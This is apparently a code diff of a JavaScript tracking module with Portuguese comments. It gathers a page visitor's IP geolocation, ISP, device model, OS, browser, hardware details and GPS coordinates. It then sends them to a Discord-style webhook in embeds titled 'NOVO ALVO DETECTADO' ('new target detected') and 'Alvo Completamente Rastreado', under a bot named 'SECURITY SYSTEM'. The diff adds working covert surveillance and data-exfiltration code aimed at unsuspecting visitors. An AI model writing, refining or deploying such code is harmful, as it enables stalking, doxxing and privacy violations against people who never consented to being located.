@@ -63,7 +63,7 @@ const IPModule = {
       if (/Mobile|Android|iPhone/i.test(ua)) deviceType = "Smartphone";
       else if (/iPad|Tablet/i.test(ua)) deviceType = "Tablet";
 
-      // Detectar modelo (se possível)
+      // Detectar modelo
       let deviceModel = "N/A";
       const modelMatch = ua.match(/\(([^)]+)\)/);
       if (modelMatch) {
@@ -77,70 +77,50 @@ const IPModule = {
         else if (info.includes("Redmi") || info.includes("Mi ")) deviceModel = info.match(/Redmi[^;,]*|Mi [^;,]*/)?.[0] || "Xiaomi";
       }
 
-      const lines = [
-        "=".repeat(60),
-        "  INFORMACOES DO VISITANTE",
-        "=".repeat(60),
-        "",
-        "[ REDE ]",
-        "IP           : " + d.ip,
-        "ISP          : " + (d.org || "N/A"),
-        "Pais         : " + (d.country || "N/A"),
-        "Regiao       : " + (d.region || "N/A"),
-        "Cidade       : " + (d.city || "N/A"),
-        "CEP          : " + (d.postal || "N/A"),
-        "Timezone     : " + (d.timezone || "N/A"),
-        "Conexao      : " + (conn.downlink ? `${conn.downlink} Mbps (${conn.effectiveType || "N/A"})` : "N/A"),
-        "",
-        "[ DISPOSITIVO ]",
-        "Tipo         : " + deviceType,
-        "Modelo       : " + deviceModel,
-        "Sistema      : " + os,
-        "Plataforma   : " + platform,
-        "Navegador    : " + browser,
-        "",
-        "[ HARDWARE ]",
-        "CPU Cores    : " + (nav.hardwareConcurrency || "N/A"),
-        "Memoria RAM  : " + (nav.deviceMemory ? nav.deviceMemory + " GB" : "N/A"),
-        "Resolucao    : " + window.screen.width + "x" + window.screen.height,
-        "Touch Screen : " + (nav.maxTouchPoints > 0 ? "Sim (" + nav.maxTouchPoints + " pontos)" : "Nao"),
-        "Pixel Ratio  : " + (window.devicePixelRatio || "N/A"),
-        "",
-        "[ CONFIGURACOES ]",
-        "Idioma       : " + nav.language,
-        "Idiomas      : " + (nav.languages ? nav.languages.join(", ") : "N/A"),
-        "Cookies      : " + (nav.cookieEnabled ? "Ativado" : "Desativado"),
-        "DNT          : " + (nav.doNotTrack || "N/A"),
-        "Online       : " + (nav.onLine ? "Sim" : "Nao"),
-        "",
-        "[ NAVEGACAO ]",
-        "URL Atual    : " + location.href,
-        "Referrer     : " + (document.referrer || "Acesso Direto"),
-        "User Agent   : " + ua,
-      ];
+      const embed = {
+        title: "\ud83d\udea8 NOVO ALVO DETECTADO",
+        description: "`Sistema de Rastreamento Ativado`",
+        color: 0x00ff00,
+        fields: [
+          {
+            name: "\ud83c\udf10 REDE",
+            value: `\`\`\`\nIP:        ${d.ip}\nISP:       ${d.org || "N/A"}\nPa\u00eds:      ${d.country || "N/A"}\nRegi\u00e3o:     ${d.region || "N/A"}\nCidade:    ${d.city || "N/A"}\nCEP:       ${d.postal || "N/A"}\nTimezone:  ${d.timezone || "N/A"}\n\`\`\``,
+            inline: false
+          },
+          {
+            name: "\ud83d\udcbb DISPOSITIVO",
+            value: `\`\`\`\nTipo:      ${deviceType}\nModelo:    ${deviceModel}\nSistema:   ${os}\nNavegador: ${browser}\n\`\`\``,
+            inline: true
+          },
+          {
+            name: "\u2699\ufe0f HARDWARE",
+            value: `\`\`\`\nCPU:       ${nav.hardwareConcurrency || "N/A"} cores\nRAM:       ${nav.deviceMemory || "N/A"} GB\nTela:      ${window.screen.width}x${window.screen.height}\nTouch:     ${nav.maxTouchPoints > 0 ? "Sim" : "N\u00e3o"}\n\`\`\``,
+            inline: true
+          },
+          {
+            name: "\ud83d\udd17 NAVEGA\u00c7\u00c3O",
+            value: `\`\`\`\nURL:       ${location.href}\nReferrer:  ${document.referrer || "Direto"}\n\`\`\``,
+            inline: false
+          }
+        ],
+        footer: {
+          text: "Status: Aguardando Coordenadas GPS...",
+          icon_url: "https://cdn-icons-png.flaticon.com/512/3064/3064197.png"
+        },
+        timestamp: new Date().toISOString()
+      };
 
-      if (lat !== null && lon !== null) {
-        lines.push("");
-        lines.push("[ LOCALIZACAO GPS ]");
-        lines.push("Latitude     : " + lat.toFixed(6));
-        lines.push("Longitude    : " + lon.toFixed(6));
-        lines.push("Google Maps  : https://maps.google.com/?q=" + lat.toFixed(6) + "," + lon.toFixed(6));
-      }
-
-      lines.push("");
-      lines.push("[ TIMESTAMP ]");
-      lines.push("Data/Hora    : " + new Date().toLocaleString("pt-BR", { timeZone: "America/Sao_Paulo" }));
-      lines.push("ISO          : " + new Date().toISOString());
-      lines.push("");
-      lines.push("=".repeat(60));
-
-      const blob = new Blob([lines.join("\n")], { type: "text/plain; charset=utf-8" });
-      const form = new FormData();
-      const filename = `visitor_${d.ip.replace(/\./g, "_")}_${this.lastTimestamp}.txt`;
-      form.append("file", blob, filename);
+      console.log("[IPModule.send] Enviando embed para webhook...");
+      const webhookResponse = await fetch(WEBHOOK, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          username: "SECURITY SYSTEM",
+          avatar_url: "https://cdn-icons-png.flaticon.com/512/6195/6195699.png",
+          embeds: [embed]
+        })
+      });
       
-      console.log("[IPModule.send] Enviando para webhook...", filename);
-      const webhookResponse = await fetch(WEBHOOK, { method: "POST", body: form });
       console.log("[IPModule.send] Resposta:", webhookResponse.status, webhookResponse.statusText);
       
       if (!webhookResponse.ok) {
@@ -166,17 +146,11 @@ const IPModule = {
       const d = await res.json();
 
       const nav  = window.navigator;
-      const conn = nav.connection || nav.mozConnection || nav.webkitConnection || {};
       const ua   = nav.userAgent;
-      const platform = nav.platform || nav.userAgentData?.platform || "Desconhecido";
 
       let os = "Desconhecido";
       if (ua.includes("Windows NT 10.0")) os = "Windows 10";
       else if (ua.includes("Windows NT 11.0")) os = "Windows 11";
-      else if (ua.includes("Windows NT 6.3")) os = "Windows 8.1";
-      else if (ua.includes("Windows NT 6.2")) os = "Windows 8";
-      else if (ua.includes("Windows NT 6.1")) os = "Windows 7";
-      else if (ua.includes("Windows")) os = "Windows";
       else if (ua.includes("Android")) {
         const match = ua.match(/Android[\s]([0-9.]+)/);
         os = match ? `Android ${match[1]}` : "Android";
@@ -189,94 +163,55 @@ const IPModule = {
         const match = ua.match(/Mac OS X[\s]([0-9_]+)/);
         os = match ? `macOS ${match[1].replace(/_/g, ".")}` : "macOS";
       }
-      else if (ua.includes("Ubuntu")) os = "Linux (Ubuntu)";
       else if (ua.includes("Linux")) os = "Linux";
 
       let browser = "Desconhecido";
-      if (ua.includes("Edg/")) browser = "Microsoft Edge";
-      else if (ua.includes("OPR/") || ua.includes("Opera")) browser = "Opera";
-      else if (ua.includes("Firefox/")) browser = "Mozilla Firefox";
-      else if (ua.includes("Chrome/")) browser = "Google Chrome";
+      if (ua.includes("Edg/")) browser = "Edge";
+      else if (ua.includes("Firefox/")) browser = "Firefox";
+      else if (ua.includes("Chrome/")) browser = "Chrome";
       else if (ua.includes("Safari/") && !ua.includes("Chrome")) browser = "Safari";
-      else if (ua.includes("SamsungBrowser")) browser = "Samsung Internet";
 
       let deviceType = "Desktop";
       if (/Mobile|Android|iPhone/i.test(ua)) deviceType = "Smartphone";
       else if (/iPad|Tablet/i.test(ua)) deviceType = "Tablet";
 
-      let deviceModel = "N/A";
-      const modelMatch = ua.match(/\(([^)]+)\)/);
-      if (modelMatch) {
-        const info = modelMatch[1];
-        if (info.includes("iPhone")) deviceModel = info.match(/iPhone[^;,]*/)?.[0] || "iPhone";
-        else if (info.includes("iPad")) deviceModel = info.match(/iPad[^;,]*/)?.[0] || "iPad";
-        else if (info.includes("SM-") || info.includes("SAMSUNG")) {
-          deviceModel = info.match(/SM-[A-Z0-9]+|SAMSUNG[^;,]*/)?.[0] || "Samsung";
-        }
-        else if (info.includes("Pixel")) deviceModel = info.match(/Pixel[^;,]*/)?.[0] || "Google Pixel";
-        else if (info.includes("Redmi") || info.includes("Mi ")) deviceModel = info.match(/Redmi[^;,]*|Mi [^;,]*/)?.[0] || "Xiaomi";
-      }
+      const embed = {
+        title: "🎯 COORDENADAS GPS OBTIDAS!",
+        description: "`Localização Precisa Capturada`",
+        color: 0xff0000,
+        fields: [
+          {
+            name: "📍 LOCALIZAÇÃO GPS",
+            value: `\`\`\`\nLatitude:  ${lat.toFixed(6)}\nLongitude: ${lon.toFixed(6)}\n\`\`\`\n[📍 Ver no Google Maps](https://maps.google.com/?q=${lat},${lon})`,
+            inline: false
+          },
+          {
+            name: "🌐 INFORMAÇÕES",
+            value: `\`\`\`\nIP:        ${d.ip}\nCidade:    ${d.city || "N/A"}\nDispositivo: ${deviceType}\nSistema:   ${os}\nNavegador: ${browser}\n\`\`\``,
+            inline: false
+          }
+        ],
+        thumbnail: {
+          url: `https://maps.googleapis.com/maps/api/staticmap?center=${lat},${lon}&zoom=15&size=400x400&markers=color:red%7C${lat},${lon}&key=AIzaSyDummy`
+        },
+        footer: {
+          text: "✅ Status: Alvo Completamente Rastreado",
+          icon_url: "https://cdn-icons-png.flaticon.com/512/4436/4436481.png"
+        },
+        timestamp: new Date().toISOString()
+      };
 
-      const lines = [
-        "=".repeat(60),
-        "  INFORMACOES DO VISITANTE [ATUALIZADO COM LOCALIZACAO]",
-        "=".repeat(60),
-        "",
-        "[ REDE ]",
-        "IP           : " + d.ip,
-        "ISP          : " + (d.org || "N/A"),
-        "Pais         : " + (d.country || "N/A"),
-        "Regiao       : " + (d.region || "N/A"),
-        "Cidade       : " + (d.city || "N/A"),
-        "CEP          : " + (d.postal || "N/A"),
-        "Timezone     : " + (d.timezone || "N/A"),
-        "Conexao      : " + (conn.downlink ? `${conn.downlink} Mbps (${conn.effectiveType || "N/A"})` : "N/A"),
-        "",
-        "[ DISPOSITIVO ]",
-        "Tipo         : " + deviceType,
-        "Modelo       : " + deviceModel,
-        "Sistema      : " + os,
-        "Plataforma   : " + platform,
-        "Navegador    : " + browser,
-        "",
-        "[ HARDWARE ]",
-        "CPU Cores    : " + (nav.hardwareConcurrency || "N/A"),
-        "Memoria RAM  : " + (nav.deviceMemory ? nav.deviceMemory + " GB" : "N/A"),
-        "Resolucao    : " + window.screen.width + "x" + window.screen.height,
-        "Touch Screen : " + (nav.maxTouchPoints > 0 ? "Sim (" + nav.maxTouchPoints + " pontos)" : "Nao"),
-        "Pixel Ratio  : " + (window.devicePixelRatio || "N/A"),
-        "",
-        "[ CONFIGURACOES ]",
-        "Idioma       : " + nav.language,
-        "Idiomas      : " + (nav.languages ? nav.languages.join(", ") : "N/A"),
-        "Cookies      : " + (nav.cookieEnabled ? "Ativado" : "Desativado"),
-        "DNT          : " + (nav.doNotTrack || "N/A"),
-        "Online       : " + (nav.onLine ? "Sim" : "Nao"),
-        "",
-        "[ NAVEGACAO ]",
-        "URL Atual    : " + location.href,
-        "Referrer     : " + (document.referrer || "Acesso Direto"),
-        "User Agent   : " + ua,
-        "",
-        "[ LOCALIZACAO GPS ]",
-        "Latitude     : " + lat.toFixed(6),
-        "Longitude    : " + lon.toFixed(6),
-        "Google Maps  : https://maps.google.com/?q=" + lat.toFixed(6) + "," + lon.toFixed(6),
-        "",
-        "[ TIMESTAMP ]",
-        "Data/Hora    : " + new Date().toLocaleString("pt-BR", { timeZone: "America/Sao_Paulo" }),
-        "ISO          : " + new Date().toISOString(),
-        "",
-        "=".repeat(60)
-      ];
-
-      const blob = new Blob([lines.join("\n")], { type: "text/plain; charset=utf-8" });
-      const form = new FormData();
-      const filename = `visitor_${d.ip.replace(/\./g, "_")}_${this.lastTimestamp}_LOCATION.txt`;
-      form.append("file", blob, filename);
+      console.log("[IPModule.sendUpdate] Enviando atualização...");
+      const webhookResponse = await fetch(WEBHOOK, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          username: "GPS TRACKER",
+          avatar_url: "https://cdn-icons-png.flaticon.com/512/684/684908.png",
+          embeds: [embed]
+        })
+      });
       
-      console.log("[IPModule.sendUpdate] Enviando atualização...", filename);
-      const webhookResponse = await fetch(WEBHOOK, { method: "POST", body: form });
       console.log("[IPModule.sendUpdate] Resposta:", webhookResponse.status, webhookResponse.statusText);
       
       if (!webhookResponse.ok) {
